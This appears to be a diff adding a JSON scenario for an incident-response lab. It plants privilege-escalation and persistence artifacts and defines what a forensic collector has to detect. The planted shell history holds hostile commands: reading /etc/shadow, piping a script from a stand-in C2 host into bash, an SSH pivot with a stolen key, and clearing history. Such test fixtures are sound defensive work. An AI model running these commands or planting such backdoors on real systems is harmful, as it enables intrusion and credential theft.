@@ -1,0 +1,61 @@
+{
+  "name": "privesc_credaccess",
+  "incident_id": "IR-LAB-PRIVESC",
+  "description": "Privilege escalation and credential access, plus a process wearing a kernel-thread name. Mid-tier tradecraft: nothing is hidden from the kernel, but each item defeats a naive check — a file capability is not SUID, a sudoers drop-in is not /etc/sudoers, and [kworker] reads as legitimate to anyone scanning a process list by eye.",
+
+  "plant": [
+    {"id": "sudoers",   "type": "sudoers", "path": "/etc/sudoers.d/ir-lab-escalate",
+     "line": "nobody ALL=(ALL) NOPASSWD: /bin/bash"},
+
+    {"id": "fcap",      "type": "capability", "path": "/usr/local/bin/ir-lab-capsetuid",
+     "cap": "cap_setuid+ep"},
+
+    {"id": "history",   "type": "bash_history", "path": "/root/.bash_history",
+     "lines": ["cat /etc/shadow",
+               "curl -s http://ir-lab-c2.example/stage2.sh | bash",
+               "ssh -i /tmp/ir-lab-stolen.key deploy@10.10.10.10",
+               "history -c"]},
+
+    {"id": "knownhosts","type": "ssh_known_hosts", "home": "/root",
+     "hosts": ["ir-lab-pivot.example ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILABPIVOTHOSTirlabpivot"]},
+
+    {"id": "listener",  "type": "listener", "port": 41337},
+
+    {"id": "kworker",   "type": "masquerade_proc", "path": "/usr/local/bin/ir-lab-masq",
+     "argv0": "[kworker/1:2]"},
+
+    {"id": "dropper",   "type": "tmp_exec", "path": "/tmp/ir-lab-dropper"}
+  ],
+
+  "expect": [
+    {"id": "a sudoers drop-in granting NOPASSWD is collected",
+     "artifact": "sudoers.txt", "contains": "NOPASSWD: /bin/bash", "needs_plant": "sudoers"},
+
+    {"id": "the sudoers drop-in is attributed to the file it came from",
+     "artifact": "sudoers.txt", "contains": "/etc/sudoers.d/ir-lab-escalate", "needs_plant": "sudoers"},
+
+    {"id": "file capabilities are collected (a capability is not SUID)",
+     "artifact": "file_capabilities.txt", "contains": "ir-lab-capsetuid", "needs_plant": "fcap"},
+
+    {"id": "shell history is collected",
+     "artifact": "bash_history.txt", "contains": "stage2.sh", "needs_plant": "history"},
+
+    {"id": "ssh known_hosts are collected (where the host reached next)",
+     "artifact": "ssh_known_hosts.txt", "contains": "ir-lab-pivot", "needs_plant": "knownhosts"},
+
+    {"id": "a listening backdoor socket is collected",
+     "artifact": "forensics/sockets.txt", "contains": "41337", "needs_plant": "listener"},
+
+    {"id": "a process masquerading as a kernel thread is collected",
+     "artifact": "forensics/processes.txt", "contains": "kworker/1:2", "needs_plant": "kworker"},
+
+    {"id": "a process masquerading as a kernel thread is FLAGGED",
+     "finding_contains": "kworker/1:2", "needs_plant": "kworker"},
+
+    {"id": "a binary running from /tmp is collected",
+     "artifact": "forensics/processes.txt", "contains": "ir-lab-dropper", "needs_plant": "dropper"},
+
+    {"id": "a binary running from /tmp is FLAGGED",
+     "finding_contains": "ir-lab-dropper", "needs_plant": "dropper"}
+  ]
+}
